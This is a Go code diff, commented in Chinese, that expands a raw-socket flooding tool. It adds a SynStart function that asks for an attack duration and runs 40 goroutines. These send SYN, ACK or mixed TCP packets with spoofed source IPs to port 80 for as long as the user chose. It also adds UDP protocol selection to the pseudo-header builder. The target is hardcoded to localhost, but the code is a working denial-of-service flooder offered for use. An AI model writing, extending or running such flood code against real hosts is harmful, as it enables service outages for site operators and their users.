@@ -9,6 +9,7 @@ import (
 	"net"
 	"strconv"
 	"strings"
+	"sync"
 	"syscall"
 	"time"
 	"unsafe"
@@ -51,10 +52,14 @@ func (tcp TCPHeader)makeTcpHeader(destPort int ,flag int) TCPHeader{
 	return tcp
 }
 
-func (psd PsdHeader)makePsdHeader(srcIp string,destIp string) PsdHeader{
+func (psd PsdHeader)makePsdHeader(srcIp string,destIp string,judgetcp bool) PsdHeader{
 	psd.SrcAddr=inet_addr(srcIp)
 	psd.DstAddr=inet_addr(destIp)
-	psd.ProtoType= syscall.IPPROTO_TCP//6代表tcp
+	if judgetcp{
+		psd.ProtoType= syscall.IPPROTO_TCP//6代表tcp
+	}else {
+		psd.ProtoType= syscall.IPPROTO_UDP//17
+	}
 	psd.TcpLength=uint16(20)
 	psd.Zero=0
 	return psd
@@ -207,7 +212,7 @@ func work(srcIp string,destIp string,destPort int,flag int,fd syscall.Handle) {
 	var ipHeader IpHeader
 	var buffer bytes.Buffer
 	tcpHeader = tcpHeader.makeTcpHeader(destPort, flag)
-	pstHeader = pstHeader.makePsdHeader(srcIp, destIp)
+	pstHeader = pstHeader.makePsdHeader(srcIp, destIp,true)
 	tcpHeader, buffer = packHeader(tcpHeader, pstHeader) //插入校验和
 	tcpByte := buffer.Bytes()                            //转为数组
 	destIPbyte := net.IP(make([]byte, 4))
@@ -231,21 +236,61 @@ func work(srcIp string,destIp string,destPort int,flag int,fd syscall.Handle) {
 	}
 }
 
-func synStart()  {
+var wgSyn sync.WaitGroup
+
+func SynStart(flag int)  {
+	//var flag int
+	//fmt.Println("请输入想进行的攻击方式：1.syn，2.ack，3.syn&ack")
+	//fmt.Scan(&flag)
+	var times int64
+	fmt.Println("请输入想攻击的时长：（s/秒)")
+	fmt.Scan(&times)
 	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
 	if err != nil {
 		fmt.Println("socket err ",err)
 		return
 	}
 	//设置IP层信息，使其能够修改IP层数据
-	err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, 2, 1)
+	err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, 2, 1)//opt2代表IP_HDRINCL
 	if err != nil {
 		fmt.Println("ip err ",err)
 		return
 	}
-	work(fakeIp(),"127.0.0.1",80,2,fd)//todo ack模式
-}
+	if flag==1{
+		for i:=0;i<40;i++{
+			wgSyn.Add(1)
+			go func(starTime int64) {
+				defer wgSyn.Done()
+				for time.Now().Unix()-starTime<times{
+					work(fakeIp(),"127.0.0.1",80,2,fd)
+				}
+			}(time.Now().Unix())
+		}
+		wgSyn.Wait()
+	}else if flag==2{
+		for i:=0;i<40;i++{
+			wgSyn.Add(1)
+			go func(starTime int64) {
+				defer wgSyn.Done()
+				for time.Now().Unix()-starTime<times{
+					work(fakeIp(),"127.0.0.1",80,18,fd)
+				}
+			}(time.Now().Unix())
+		}
+		wgSyn.Wait()
+	}else {
+		for i:=0;i<40;i++{
+			wgSyn.Add(1)
+			go func(starTime int64) {
+				defer wgSyn.Done()
+				for time.Now().Unix()-starTime<times{
+					work(fakeIp(),"127.0.0.1",80,2,fd)
+					work(fakeIp(),"127.0.0.1",80,18,fd)
 
-func main(){
-	synStart()
+				}
+			}(time.Now().Unix())
+		}
+		wgSyn.Wait()
+	}
+
 }
